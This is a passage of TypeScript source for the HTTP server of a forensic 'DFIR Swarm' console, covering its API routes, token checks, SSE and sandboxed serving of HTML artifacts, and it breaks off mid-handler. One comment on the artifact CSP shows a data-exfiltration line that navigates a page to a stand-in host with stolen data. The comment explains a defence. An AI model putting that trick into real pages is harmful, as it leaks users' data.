/**
 * HTTP app for the swarm web UI: JSON API + SSE + static bundle.
 * node:http only, so `node --experimental-strip-types` runs it with zero deps.
 */
import { createHash, randomBytes, timingSafeEqual } from "node:crypto";
import { existsSync } from "node:fs";
import { pipeline } from "node:stream";
import { execFile } from "node:child_process";
import { mkdtemp, readdir, readFile, realpath, rm, stat } from "node:fs/promises";
import { finished } from "node:stream/promises";
import { tmpdir } from "node:os";
import { createServer, type IncomingMessage, type Server, type ServerResponse } from "node:http";
import { basename, extname, join, normalize, resolve, sep } from "node:path";
import {
  appendEvent,
  claimFile,
  createContext,
  EVENTS_REL,
  listFileHistory,
  readFileVersion,
  releaseFile,
  restoreFileVersion,
} from "../../extensions/protocol.ts";
import { readHistory } from "../../extensions/observe.ts";
import { ActionRunner, checkReadiness, listModels, listPacks, validateReview, validateStart, type ImagePreview, type ImagePreviewQuery, type Job, type ModelList, type ReadinessReport, type StartParams } from "./actions.ts";
import { checkVmReadiness, startFlags, type VmReadiness, type VmReadinessQuery } from "./vm-readiness.ts";
import { coverageOf } from "../coverage.ts";
import { deleteGoal, GoalError, listGoals, readGoal, saveGoal } from "./goals.ts";
import { listLibrary, readLibraryEntry } from "./library.ts";
import { describeRoots, InputsError, listInputSets, parseInputsRoots, resolveInputImage, resolveInputSet, RootStore } from "./inputs.ts";
import { countForgedTools, findRun, listSwarmRows, listWorkFiles, liveHubDirs, operatorAudit, queryTraces, readAllPosts, readRunEvents, readSwarmView, readTimedPosts, resolveToolOutputFile, resolveWorkFile } from "./model.ts";
import { readReviews } from "./reviews.ts";
import { readStoreJob, readStoreJobLog, readStoreJobs, storeJobLogFile } from "./store-jobs.ts";
import { userInfo } from "node:os";
import { hashArtifacts } from "../artifacts.ts";
import { hashRegularFile, openRegular } from "../regular-file.ts";
import { buildDossier } from "../dossier.ts";
import { renderReport } from "../report.ts";
import { summarize } from "../summary.ts";
import { readForgedTool, TOOL_NAME_RE } from "../../extensions/protocol.ts";
import { ChangeBus, HubWatch, type HubDir } from "./watch.ts";
import { packageInfo, zipDirectory } from "./zip.ts";

/**
 * Where a checkout's runs live, when nothing says otherwise. Runs are in runs/;
 * a checkout from before the rename still has them in sandbox-runs/ and keeps
 * reading them there. scripts/swarm.sh decides this exactly the same way, and
 * the console hands its answer to swarm.sh in SWARM_RUNS_DIR when it starts a
 * swarm, so the two can never disagree about where a run went.
 */
export function defaultRunsDir(root: string): string {
  const now = join(root, "runs");
  const before = join(root, "sandbox-runs");
  return !existsSync(now) && existsSync(before) ? before : now;
}

export type UiAppOptions = {
  root: string;
  runsDir: string;
  /**
   * Shared secret for the calls that spend money or change a run. Reading
   * stays open to whoever can reach the bound address (this machine only by
   * default; the LAN with --host 0.0.0.0), but starting, stopping, reaping
   * and restoring need it. Empty disables the check, which is the old
   * behaviour.
   */
  token?: string;
  distDir?: string;
  runner?: ActionRunner;
  bus?: ChangeBus;
  /** The live VM runs' hub directories to watch; tests inject one. */
  liveHubDirs?: () => Promise<HubDir[]>;
  models?: () => Promise<ModelList>;
  /** Which providers are usable right now; tests inject one so no `pi` runs. */
  readiness?: (models: string[]) => Promise<ReadinessReport>;
  /** Where the sets a kickoff may hand a swarm as read-only inputs live: one path, or several with `:` between. */
  inputsRoot?: string;
  /** Let the token holder add a root from the form. Off unless the operator says so. */
  allowRuntimeRoots?: boolean;
  heartbeatMs?: number;
  /** How long a finish-line result stands whatever happens on disk; tests shorten it. */
  checksTtlMs?: number;
  /** How long a grant to open one HTML artifact with its scripts stays good; tests shorten it. */
  scriptGrantTtlMs?: number;
  /** Can this host run VMs: tests inject one so no msb runs. */
  vmReadiness?: (q: VmReadinessQuery) => Promise<VmReadiness>;
  /** The flags `swarm.sh help start` lists; tests inject them. */
  startFlags?: () => Promise<string[]>;
};

export type UiApp = {
  server: Server;
  bus: ChangeBus;
  hubWatch: HubWatch;
  runner: ActionRunner;
  listen(port: number, host: string): Promise<{ port: number; host: string }>;
  close(): Promise<void>;
};

const MIME: Record<string, string> = {
  ".html": "text/html; charset=utf-8",
  ".htm": "text/html; charset=utf-8",
  ".js": "text/javascript; charset=utf-8",
  ".mjs": "text/javascript; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".json": "application/json; charset=utf-8",
  ".svg": "image/svg+xml",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".gif": "image/gif",
  ".webp": "image/webp",
  ".ico": "image/x-icon",
  ".txt": "text/plain; charset=utf-8",
  ".md": "text/plain; charset=utf-8",
  ".csv": "text/plain; charset=utf-8",
  ".log": "text/plain; charset=utf-8",
  // Everything else an agent writes that a browser can show as text. Without
  // these the type falls through to application/octet-stream and the browser
  // downloads the file instead of opening it — which is what "Open in new
  // tab" did to a .jsonl trace and a .err from a shell call.
  ".jsonl": "text/plain; charset=utf-8",
  ".yaml": "text/plain; charset=utf-8",
  ".yml": "text/plain; charset=utf-8",
  ".xml": "text/plain; charset=utf-8",
  ".py": "text/plain; charset=utf-8",
  ".sh": "text/plain; charset=utf-8",
  ".ts": "text/plain; charset=utf-8",
  ".tsv": "text/plain; charset=utf-8",
  ".err": "text/plain; charset=utf-8",
  ".out": "text/plain; charset=utf-8",
  ".ini": "text/plain; charset=utf-8",
  ".conf": "text/plain; charset=utf-8",
  ".pdf": "application/pdf",
  ".woff2": "font/woff2",
  ".woff": "font/woff",
  ".map": "application/json; charset=utf-8",
};

class HttpError extends Error {
  status: number;
  constructor(status: number, message: string) {
    super(message);
    this.status = status;
  }
}

function json(res: ServerResponse, status: number, body: unknown): void {
  res.writeHead(status, {
    "content-type": "application/json; charset=utf-8",
    "cache-control": "no-store",
  });
  res.end(`${JSON.stringify(body)}\n`);
}

/** Constant-time compare, so a wrong token cannot be guessed byte by byte. */
function sameSecret(given: string, expected: string): boolean {
  if (!given || given.length !== expected.length) return false;
  return timingSafeEqual(Buffer.from(given), Buffer.from(expected));
}

function safeId(value: string | undefined): string {
  if (!value || !/^[a-zA-Z0-9_-]{1,32}$/.test(value)) throw new HttpError(400, "invalid id");
  return value;
}

async function readBody(req: IncomingMessage, limit = 64 * 1024): Promise<unknown> {
  const chunks: Buffer[] = [];
  let size = 0;
  for await (const chunk of req) {
    size += (chunk as Buffer).length;
    if (size > limit) throw new HttpError(413, "body too large");
    chunks.push(chunk as Buffer);
  }
  if (!chunks.length) return {};
  try {
    return JSON.parse(Buffer.concat(chunks).toString("utf8"));
  } catch {
    throw new HttpError(400, "body is not valid JSON");
  }
}

/**
 * `download` forces the browser to save rather than render. Without it a file
 * whose type the browser can show opens in the tab, which is what a reader
 * asking to see an artifact means; with it, any file saves, which is what a
 * reader asking for a copy means. Two intentions, two answers, neither
 * guessed from the file extension.
 */
function fileHeaders(abs: string, size: number, extraHeaders: Record<string, string>, download: boolean): Record<string, string> {
  const type = MIME[extname(abs).toLowerCase()] ?? "application/octet-stream";
  // Names under work/ come from evidence and can be in any script. Node
  // refuses a header value above U+00FF (and mangles some that pass), so the
  // quoted filename is an ASCII stand-in and the real name goes in the
  // RFC 5987 filename*, which browsers prefer when both are present.
  const name = basename(abs);
  const fallback = name.replace(/[^\x20-\x7e]|["\\]/g, "_");
  const encoded = encodeURIComponent(name).replace(/['()*]/g, (c) => `%${c.charCodeAt(0).toString(16).toUpperCase()}`);
  return {
    "content-type": type,
    "content-length": String(size),
    "cache-control": "no-store",
    "content-disposition": `${download ? "attachment" : "inline"}; filename="${fallback}"; filename*=UTF-8''${encoded}`,
    ...extraHeaders,
  };
}

async function sendFile(
  res: ServerResponse,
  abs: string,
  extraHeaders: Record<string, string> = {},
  download = false,
): Promise<void> {
  // Opened once, as a regular file, and served from that handle: a stat
  // then an open by name let a live VM swap a checked file for a FIFO in
  // between, and the open would hold an I/O thread for good.
  const opened = await openRegular(abs);
  if ("why" in opened) throw new HttpError(404, opened.why === "missing" ? "no such file" : `not served: ${opened.why}`);
  res.writeHead(200, fileHeaders(abs, opened.size, extraHeaders, download));
  // The headers are out, so a read that fails now can only cut the response
  // short; pipeline closes the handle whichever side ends first (a reader
  // who goes away mid-download included), and its error is swallowed rather
  // than taking the whole console down.
  pipeline(opened.handle.createReadStream(), res, () => undefined);
}

/**
 * An HTML artifact, as the console serves it: agent output, or evidence
 * carved into an .html file. A sandbox without allow-same-origin is an
 * opaque origin and connect-src 'none' stops fetch(), but neither stops a
 * page from navigating itself: `location.href = "https://x/?" + data`, or a
 * <meta http-equiv=refresh>, carried whatever the file held out of the
 * examiner's own browser, past every allowlist the run had. So no scripts,
 * and the sandbox directive's other flags (no automatic navigation, no
 * forms, no popups) hold the rest.
 */
const ARTIFACT_CSP =
  "sandbox; default-src 'none'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; connect-src 'none'; form-action 'none'; base-uri 'none'";
/**
 * The same file with its scripts, once, on the operator's word and a grant
 * (below): still an opaque origin with no fetch, no forms, no popups and no
 * top-level navigation. Scripts can still navigate the frame itself, which
 * is what the operator is warned of before asking.
 */
const ARTIFACT_SCRIPTS_CSP =
  "sandbox allow-scripts; default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; connect-src 'none'; form-action 'none'; base-uri 'none'";
/** An artifact opened with scripts is read whole, so the bytes hashed are the bytes served; past this it is not offered. */
const SCRIPTS_MAX_BYTES = 32 * 1024 * 1024;

export function createUiApp(options: UiAppOptions): UiApp {
  const root = resolve(options.root);
  const runsDir = resolve(options.runsDir);
  const distDir = options.distDir ?? join(root, "ui", "dist");
  const bus = options.bus ?? new ChangeBus(runsDir);
  // The live VM runs' hubs, outside the runs directory: their status.json
  // moves the seats' states, and the set of hubs follows the registry.
  const hubWatch = new HubWatch(bus, options.liveHubDirs ?? (() => liveHubDirs(runsDir)));
  const unwatchRegistry = bus.subscribe((msg) => {
    if (msg.event === "change" && (msg.data.kinds.includes("registry") || msg.data.swarm_ids.length === 0)) void hubWatch.refresh();
  });
  const runner =
    options.runner ??
    new ActionRunner({
      root,
      runsDir,
      onUpdate: (job: Job) => {
        bus.publish({ event: "job", data: job });
        if (job.status !== "running") bus.touch(job.swarm_id, "registry");
      },
    });
  const models = options.models ?? (() => listModels());
  const readiness = options.readiness ?? ((list: string[]) => checkReadiness(list));
  // Readiness is a handful of `pi auth check` runs; a minute's cache keeps a
  // page of kickoff visitors from spawning them on every keystroke.
  let readinessCache: { at: number; promise: Promise<ReadinessReport> } | null = null;
  const READINESS_TTL_MS = 60_000;
  function readinessFor(list: string[]): Promise<ReadinessReport> {
    if (readinessCache && Date.now() - readinessCache.at < READINESS_TTL_MS) return readinessCache.promise;
    const promise = readiness(list);
    readinessCache = { at: Date.now(), promise };
    return promise;
  }
  // The VM readiness check runs vm.ts probe and capacity (msb doctor among
  // them): a minute's cache per question, like the models' readiness.
  const vmReadiness = options.vmReadiness ?? ((q: VmReadinessQuery) => checkVmReadiness(root, runsDir, q));
  const vmReadinessCache = new Map<string, { at: number; promise: Promise<VmReadiness> }>();
  function vmReadinessFor(q: VmReadinessQuery): Promise<VmReadiness> {
    const key = JSON.stringify(q);
    const hit = vmReadinessCache.get(key);
    if (hit && Date.now() - hit.at < READINESS_TTL_MS) return hit.promise;
    const promise = vmReadiness(q);
    vmReadinessCache.set(key, { at: Date.now(), promise });
    if (vmReadinessCache.size > 32) vmReadinessCache.delete(vmReadinessCache.keys().next().value as string);
    return promise;
  }
  /**
   * A start's options as swarm.sh takes them: validated, and a set name, an
   * image name and a run id made into paths here and nowhere else. The start
   * and its check (`swarm.sh start --check`) both go through it, so the check
   * answers for exactly the start the form would make.
   */
  async function prepareStart(raw: unknown): Promise<StartParams> {
    const check = validateStart(raw);
    if (!check.ok) throw new HttpError(400, check.error);
    // A set name, an image name and a run id become paths here and nowhere else.
    try {
      if (check.params.inputs_image) {
        if (process.platform !== "darwin") throw new HttpError(400, "attaching a disk image needs macOS (hdiutil); on this host hand the swarm a directory");
        const slash = check.params.inputs_image.indexOf("/");
        check.params.inputs_image_path = await resolveInputImage(await inputsRoots(), check.params.inputs_image.slice(0, slash), check.params.inputs_image.slice(slash + 1));
        check.params.inputs = undefined;
      } else if (check.params.inputs) {
        check.params.inputs_dir = await resolveInputSet(await inputsRoots(), check.params.inputs);
      }
    } catch (err) {
      if (err instanceof InputsError) throw new HttpError(err.status, err.message);
      throw err;
    }
    if (check.params.tools_from) {
      const from = await findRun(runsDir, check.params.tools_from);
      const dir = from?.sandbox ? join(String(from.sandbox), "tools") : "";
      const forged = from?.sandbox ? await countForgedTools(String(from.sandbox)) : 0;
      if (!from) throw new HttpError(404, `no run ${check.params.tools_from} to take tools from`);
      if (forged === 0) throw new HttpError(400, `run ${check.params.tools_from} forged no tools`);
      check.params.tools_from_dir = dir;
    }
    if (check.params.no_read?.length) {
      const dirs: string[] = [];
      for (const id of check.params.no_read) {
        const run = await findRun(runsDir, id);
        const dir = run?.sandbox ? await realpath(String(run.sandbox)).catch(() => null) : null;
        if (!dir) throw new HttpError(404, `no run ${id} to keep unreadable`);
        dirs.push(dir);
      }
      check.params.no_read_dirs = dirs;
    }
    return check.params;
  }

  const imagePreviewCache = new Map<string, { at: number; promise: Promise<ImagePreview> }>();
  function imagePreviewFor(q: ImagePreviewQuery): Promise<ImagePreview> {
    const key = JSON.stringify(q);
    const hit = imagePreviewCache.get(key);
    if (hit && Date.now() - hit.at < READINESS_TTL_MS) return hit.promise;
    const promise = runner.imageFor(q);
    imagePreviewCache.set(key, { at: Date.now(), promise });
    if (imagePreviewCache.size > 32) imagePreviewCache.delete(imagePreviewCache.keys().next().value as string);
    return promise;
  }
  const flagsOf = options.startFlags ?? (() => startFlags(root));
  let flagsCache: Promise<string[]> | null = null;
  const token = options.token ?? process.env.SWARM_UI_TOKEN ?? "";
  /**
   * One-time grants to open one HTML artifact with its scripts. The console
   * asks for one over its authenticated channel after the operator confirms;
   * it names the run, the path and the sha256 the file had then, is spent by
   * the first request that presents it, and lapses in a minute. The artifact
   * itself has no token and no scripts, so it cannot mint one; a missing,
   * spent, lapsed or mismatched grant gets the no-script file.
   */
  const scriptGrantTtlMs = options.scriptGrantTtlMs ?? 60_000;
  const scriptGrants = new Map<string, { run: string; rel: string; sha256: string; expires: number }>();
  const osUser = (() => {
    try {
      return userInfo().username;
    } catch {
      return null;
    }
  })();
  const envRoots = parseInputsRoots(options.inputsRoot ?? process.env.SWARM_INPUTS_ROOT ?? "");
  const allowRuntimeRoots = options.allowRuntimeRoots ?? process.env.SWARM_INPUTS_ROOT_FROM_UI === "1";
  const rootStore = new RootStore(join(runsDir, "inputs-roots.json"));
  const rootsLoaded = allowRuntimeRoots ? rootStore.load() : Promise.resolve([] as string[]);
  /** Every root a set may be resolved under, the operator's first. */
  async function inputsRoots(): Promise<string[]> {
    await rootsLoaded;
    const ui = allowRuntimeRoots ? rootStore.list() : [];
    return [...envRoots, ...ui.filter((r) => !envRoots.includes(r))];
  }
  async function inputsLibrary() {
    const roots = await inputsRoots();
    const ui = allowRuntimeRoots ? rootStore.list().filter((r) => !envRoots.includes(r)) : [];
    return {
      configured: roots.length > 0,
      /** The first root, for a client from before there were several. */
      root: roots[0] ?? null,
      roots: await describeRoots(envRoots, ui),
      sets: await listInputSets(roots),
      runtime_roots: allowRuntimeRoots,
      /** The server's OS: a disk image is attached with hdiutil, so only on darwin. The form says so before the kickoff refuses it. */
      platform: process.platform,
    };
  }

  /**
   * The files an examiner hands over beside the report, by download name:
   * custody.json, the verdict anchored outside the run, inputs.json, each
   * vm/<id>.json, and this run's lines of runs/operator-audit.jsonl. A
   * closed table of names; the abs path is the harness's, never a caller's.
   */
  async function courtFile(sandbox: string, id: string, name: string): Promise<{ name: string; type: string; description: string; abs?: string; body?: string } | null> {
    const jsonType = "application/json; charset=utf-8";
    if (name === "custody.json") return { name, type: jsonType, abs: join(sandbox, "custody.json"), description: "The host's custody verdict at stop: the evidence re-hashed, the trace and ledger chains, the kept outputs, each VM" };
    if (name === "custody-anchor.json") return { name, type: jsonType, abs: `${sandbox}.custody-anchor.json`, description: "The verdict's hash, kept outside the run where no agent reaches: custody.json is checked against it" };
    if (name === "inputs.json") return { name, type: jsonType, abs: join(sandbox, "inputs.json"), description: "The evidence manifest the kickoff wrote: every name with its sha256, and md5 and sha1 when taken" };
    const vm = name.match(/^vm-([A-Za-z0-9][A-Za-z0-9_-]{0,63})\.json$/);
    if (vm) return { name, type: jsonType, abs: join(sandbox, "vm", `${vm[1]}.json`), description: `The record of ${vm[1]}'s VM: its image, size, mounts, network, placeholders, probe, and what its stop did` };
    if (name === "operator-audit.jsonl") {
      const audit = await operatorAudit(runsDir, id);
      const body = audit.lines.map((l) => JSON.stringify(l)).join("\n") + (audit.lines.length ? "\n" : "");
      return { name, type: "application/x-ndjson; charset=utf-8", body, description: `This run's lines of the operator's record (who ran which command, from where). The chain is checked over the whole file in the runs directory: ${audit.detail}` };
    }
    return null;
  }
  async function courtFiles(sandbox: string, id: string): Promise<Array<{ name: string; description: string; present: boolean; reason?: string; bytes: number | null; sha256: string | null; type: string }>> {
    const names = ["custody.json", "custody-anchor.json", "inputs.json"];
    for (const f of (await readdir(join(sandbox, "vm")).catch(() => [] as string[])).sort()) {
      if (/^[A-Za-z0-9][A-Za-z0-9_-]{0,63}\.json$/.test(f)) names.push(`vm-${f}`);
    }
    names.push("operator-audit.jsonl");
    const out = [];
    for (const n of names) {
      const f = await courtFile(sandbox, id, n);
      if (!f) continue;
      if (f.body !== undefined) {
        out.push({ name: f.name, description: f.description, present: f.body.length > 0, ...(f.body.length ? {} : { reason: "no line of the operator's record names this run" }), bytes: Buffer.byteLength(f.body), sha256: createHash("sha256").update(f.body).digest("hex"), type: f.type });
        continue;
      }
      const hashed = await hashRegularFile(f.abs!);
      if (!hashed || "why" in hashed) {
        out.push({ name: f.name, description: f.description, present: false, reason: hashed && "why" in hashed ? (hashed.why === "missing" ? "not written for this run" : hashed.why) : "not read", bytes: null, sha256: null, type: f.type });
      } else {
        out.push({ name: f.name, description: f.description, present: true, bytes: hashed.size, sha256: hashed.sha256, type: f.type });
      }
    }
    return out;
  }

  /** Mutations carry the token; GET and SSE do not. */
  function requireToken(req: IncomingMessage, _url: URL): void {
    if (!token) return;
    const header = req.headers.authorization ?? "";
    // RFC 9110: the scheme name is case-insensitive.
    const bearer = /^bearer\s+/i.test(header) ? header.replace(/^bearer\s+/i, "").trim() : "";
    if (sameSecret(bearer, token)) return;
    throw new HttpError(401, "this action needs the server token (Authorization: Bearer ...)");
  }
  const heartbeatMs = options.heartbeatMs ?? 15000;
  const sseClients = new Set<ServerResponse>();

  /**
   * The finish line: the goal's checks, run in the sandbox the same way
   * await-done.sh certifies a run, so the panel and the CLI can never disagree.
   * Checks are operator-authored shell commands reading agent-written files,
   * so a result is cached and a swarm's checks never run concurrently —
   * whoever can reach the console can watch without the token, and watching
   * must not become a way to hammer the host. A result stands for the TTL, and beyond it for as long as
   * nothing under the sandbox has changed: the checks read what the agents
   * wrote, so a quiet or finished swarm never sends the console to the shell
   * again. Only an attached watcher can vouch for "nothing changed"; while
   * the bus is polling, the TTL alone decides.
   */
  const checksCache = new Map<string, { at: number; touched: number; promise: Promise<unknown> }>();
  const CHECKS_TTL_MS = options.checksTtlMs ?? 10_000;
  let checksRuns = 0;
  function runChecks(id: string, sandbox: string): Promise<unknown> {
    const cached = checksCache.get(id);
    const touched = bus.lastTouched(id);
    if (cached && (Date.now() - cached.at < CHECKS_TTL_MS || (bus.watching && cached.touched === touched))) return cached.promise;
    checksRuns += 1;
    const promise = new Promise<unknown>((resolvePromise) => {
      execFile(
        "bash",
        [join(root, "scripts", "await-done.sh"), "--sandbox", sandbox, "--checks-json"],
        { cwd: root, env: { ...process.env, SWARM_RUNS_DIR: runsDir }, timeout: 120_000, maxBuffer: 1024 * 1024 },
        (err, stdout) => {
          if (err && !stdout) {
            resolvePromise({ sentinel: false, source: null, total: 0, passed: 0, checks: [], error: err.message });
            return;
          }
          try {
            resolvePromise(JSON.parse(stdout));
          } catch {
            resolvePromise({ sentinel: false, source: null, total: 0, passed: 0, checks: [], error: "unreadable checks output" });
          }
        },
      );
    });
    checksCache.set(id, { at: Date.now(), touched, promise });
    return promise;
  }

  async function requireRun(id: string) {
    const run = await findRun(runsDir, id);
    if (!run) throw new HttpError(404, "swarm not found");
    const sandbox = typeof run.sandbox === "string" ? run.sandbox : join(runsDir, id);
    return { run, sandbox };
  }

  async function serveStatic(res: ServerResponse, pathname: string): Promise<void> {
    const distIndex = join(distDir, "index.html");
    const hasDist = await stat(distIndex).then((s) => s.isFile()).catch(() => false);
    if (!hasDist) {
      res.writeHead(503, { "content-type": "text/html; charset=utf-8" });
      res.end(
        `<!doctype html><meta charset="utf-8"><meta name="application-name" content="DFIR Swarm"><title>DFIR Swarm</title>
<body style="font:15px/1.5 system-ui;max-width:42rem;margin:4rem auto;padding:0 1rem;color:#1c1b1a;background:#f7f5f0">
<h1 style="font-size:1.25rem">Web bundle not built</h1>
<p>The JSON API is live at <code>/api/swarms</code>, but <code>ui/dist/index.html</code> is missing.</p>
<p>Run <code>npm install &amp;&amp; npm run ui:build</code> and reload, or use <code>npm run ui:dev</code> for the Vite dev server.</p>
</body>`,
      );
      return;
    }
    const clean = normalize(decodeURIComponent(pathname)).replace(/^(\.\.[/\\])+/, "");
    const candidate = resolve(distDir, `.${clean}`);
    if (candidate.startsWith(distDir) && clean !== "/" && (await stat(candidate).then((s) => s.isFile()).catch(() => false))) {
      const headers: Record<string, string> = clean.startsWith("/assets/")
        ? { "cache-control": "public, max-age=31536000, immutable" }
        : {};
      await sendFile(res, candidate, headers);
      return;
    }
    await sendFile(res, distIndex);
  }

  function openSse(req: IncomingMessage, res: ServerResponse): void {
    res.writeHead(200, {
      "content-type": "text/event-stream",
      "cache-control": "no-store",
      connection: "keep-alive",
      "x-accel-buffering": "no",
    });
    const write = (event: string, data: unknown) => {
      res.write(`event: ${event}\ndata: ${JSON.stringify(data)}\n\n`);
    };
    write("hello", { runs_dir: runsDir, watching: bus.watching, at: new Date().toISOString() });
    const unsubscribe = bus.subscribe((msg) => write(msg.event, msg.data));
    const beat = setInterval(() => res.write(`: ping ${Date.now()}\n\n`), heartbeatMs);
    sseClients.add(res);
    const cleanup = () => {
      clearInterval(beat);
      unsubscribe();
      sseClients.delete(res);
    };
    req.on("close", cleanup);
    res.on("close", cleanup);
  }

  async function handle(req: IncomingMessage, res: ServerResponse): Promise<void> {
    const url = new URL(req.url || "/", `http://${req.headers.host || "127.0.0.1"}`);
    const method = req.method ?? "GET";
    const path = url.pathname;

    if (method === "OPTIONS") {
      res.writeHead(204);
      res.end();
      return;
    }

    if (!path.startsWith("/api/")) {
      if (method !== "GET" && method !== "HEAD") throw new HttpError(405, "method not allowed");
      await serveStatic(res, path);
      return;
    }

    if (path === "/api/health") {
      json(res, 200, {
        ok: true,
        runs_dir: runsDir,
        auth: Boolean(token),
        watching: bus.watching,
        sse_clients: sseClients.size,
        jobs: runner.list().filter((j) => j.status === "running").length,
        /** How many times this process has sent the finish line to the shell. */
        checks_runs: checksRuns,
        now: new Date().toISOString(),
      });
      return;
    }
    if (path === "/api/events") {
      openSse(req, res);
      return;
    }
    if (path === "/api/models") {
      json(res, 200, await models());
      return;
    }
    // Can this host run the agents in microVMs: before Start, not after.
    if (path === "/api/vm/readiness") {
      if (method !== "GET") throw new HttpError(405, "method not allowed");
      const num = (k: string) => {
        const v = Number(url.searchParams.get(k));
        return Number.isInteger(v) && v > 0 && v < 1e7 ? v : undefined;
      };
      const image = (url.searchParams.get("image") ?? "").trim();
      if (image && !/^[A-Za-z0-9][A-Za-z0-9._/:@-]{0,255}$/.test(image)) throw new HttpError(400, "image is not an image reference");
      json(res, 200, await vmReadinessFor({ image: image || undefined, n: num("n"), cpus: num("cpus"), memory: num("memory") }));
      return;
    }
    // `swarm.sh start --check` with the form's options: the start's own
    // checks, nothing written. Its BLOCKER and WARN lines go back to the form
    // whole, with every --env value and the notify command taken out.
    if (path === "/api/start/check") {
      if (method !== "POST") throw new HttpError(405, "method not allowed");
      requireToken(req, url);
      json(res, 200, await runner.check(await prepareStart(await readBody(req))));
      return;
    }
    // The image a kickoff with these packs would boot: `swarm.sh image-for`
    // (read only), so the form never guesses it.
    if (path === "/api/vm/image") {
      if (method !== "GET") throw new HttpError(405, "method not allowed");
      const packs = (url.searchParams.get("packs") ?? "").split(",").map((p) => p.trim()).filter(Boolean);
      if (packs.length > 32 || packs.some((p) => !/^[a-z0-9][a-z0-9._-]{0,63}$/.test(p))) throw new HttpError(400, "packs must be pack ids");
      const toolsFrom = (url.searchParams.get("tools_from") ?? "").trim();
      let toolsDir: string | undefined;
      if (toolsFrom) {
        if (!/^[A-Za-z0-9_-]+$/.test(toolsFrom)) throw new HttpError(400, "tools_from must be a run id");
        const from = await findRun(runsDir, toolsFrom);
        toolsDir = from?.sandbox ? join(String(from.sandbox), "tools") : undefined;
      }
      json(res, 200, await imagePreviewFor({ packs, playwright: url.searchParams.get("playwright") === "1", tools_from_dir: toolsDir }));
      return;
    }
    // The start flags this harness documents: the form offers a newer one (--model-gateway) only when it is there.
    if (path === "/api/kickoff/flags") {
      if (method !== "GET") throw new HttpError(405, "method not allowed");
      flagsCache ??= flagsOf().catch(() => []);
      json(res, 200, { flags: await flagsCache });
      return;
    }
    // The operator's own record (runs/operator-audit.jsonl), its chain checked.
    if (path === "/api/operator-audit") {
      if (method !== "GET") throw new HttpError(405, "method not allowed");
      json(res, 200, await operatorAudit(runsDir, null));
      return;
    }
    if (path === "/api/models/readiness") {
      if (method !== "GET") throw new HttpError(405, "method not allowed");
      const list = await models();
      json(res, 200, await readinessFor(list.models));
      return;
    }

    // The goal library. Reading is open like everything else here; writing a
    // goal changes what the next swarm is asked to do, so it needs the token.
    // The inputs library: what a kickoff may hand a swarm to read.
    if (path === "/api/inputs") {
      if (method !== "GET") throw new HttpError(405, "method not allowed");
      json(res, 200, await inputsLibrary());
      return;
    }
    // Adding a root from the form is off unless the server was started with the flag; then it needs the token.
    if (path === "/api/inputs/roots") {
      if (method !== "POST") throw new HttpError(405, "method not allowed");
      if (!allowRuntimeRoots) throw new HttpError(403, "this server does not take inputs roots from the form; start it with swarm.sh ui --allow-inputs-root-from-ui, or name the root with --inputs-root DIR");
      requireToken(req, url);
      const body = (await readBody(req)) as Record<string, unknown> | null;
      try {
        await rootsLoaded;
        await rootStore.add(body?.path, envRoots);
      } catch (err) {
        if (err instanceof InputsError) throw new HttpError(err.status, err.message);
        throw err;
      }
      json(res, 200, await inputsLibrary());
      return;
    }
    const rootMatch = path.match(/^\/api\/inputs\/roots\/(\d{1,2})$/);
    if (rootMatch) {
      if (method !== "DELETE") throw new HttpError(405, "method not allowed");
      if (!allowRuntimeRoots) throw new HttpError(403, "this server does not take inputs roots from the form");
      requireToken(req, url);
      const roots = await inputsRoots();
      const target = roots[Number(rootMatch[1])];
      if (!target) throw new HttpError(404, "no such inputs root");
      if (envRoots.includes(target)) throw new HttpError(400, "that root was named when the server started; only a root added from the form can be removed here");
      await rootStore.remove(target);
      json(res, 200, await inputsLibrary());
      return;
    }

    // The installed packs, for the kickoff's pack field; read-only.
    if (path === "/api/packs") {
      if (method !== "GET") throw new HttpError(405, "method not allowed");
      json(res, 200, { packs: await listPacks() });
      return;
    }
    // The investigation library: read-only here, edited in the repo.
    if (path === "/api/library") {
      if (method !== "GET") throw new HttpError(405, "method not allowed");
      json(res, 200, { entries: await listLibrary(root) });
      return;
    }
    const libraryMatch = path.match(/^\/api\/library\/([^/]+)\/([^/]+)$/);
    if (libraryMatch) {
      if (method !== "GET") throw new HttpError(405, "method not allowed");
      const id = `${decodeURIComponent(libraryMatch[1])}/${decodeURIComponent(libraryMatch[2])}`;
      try {
        json(res, 200, await readLibraryEntry(root, id));
      } catch (err) {
        if (err instanceof GoalError) throw new HttpError(err.status, err.message);
        throw err;
      }
      return;
    }
    if (path === "/api/goals") {
      if (method !== "GET") throw new HttpError(405, "method not allowed");
      json(res, 200, { goals: await listGoals(root) });
      return;
    }
    const goalMatch = path.match(/^\/api\/goals\/([^/]+)$/);
    if (goalMatch) {
      const name = decodeURIComponent(goalMatch[1]);
      try {
        if (method === "GET") {
          json(res, 200, await readGoal(root, name));
          return;
        }
        if (method === "PUT" || method === "POST") {
          requireToken(req, url);
          const body = (await readBody(req)) as Record<string, unknown> | null;
          json(res, 200, await saveGoal(root, name, body?.text));
          return;
        }
        if (method === "DELETE") {
          requireToken(req, url);
          await deleteGoal(root, name);
          json(res, 200, { ok: true, name });
          return;
        }
      } catch (err) {
        if (err instanceof GoalError) throw new HttpError(err.status, err.message);
        throw err;
      }
      throw new HttpError(405, "method not allowed");
    }
    if (path === "/api/jobs") {
      json(res, 200, runner.list());
      return;
    }
    const jobMatch = path.match(/^\/api\/jobs\/([^/]+)$/);
    if (jobMatch) {
      const job = runner.get(jobMatch[1]);
      if (!job) throw new HttpError(404, "job not found");
      json(res, 200, job);
      return;
    }
    // An export job's file, once it is done: the ledger as CSV or a
    // Timesketch import, written by swarm.sh into the console's own temp
    // directory, never a path a caller names.
    const downloadMatch = path.match(/^\/api\/jobs\/([^/]+)\/download$/);
    if (downloadMatch) {
      if (method !== "GET") throw new HttpError(405, "method not allowed");
      const job = runner.get(downloadMatch[1]);
      if (!job || job.kind !== "export" || !job.output_file) throw new HttpError(404, "no export with that id");
      if (job.status !== "ok") throw new HttpError(409, job.status === "running" ? "the export is still running" : "the export failed; its output says why");
      await sendFile(res, job.output_file, {}, true);
      return;
    }

    if (path === "/api/swarms") {
      if (method === "GET") {
        json(res, 200, await listSwarmRows(runsDir));
        return;
      }
      if (method === "POST") {
        requireToken(req, url);
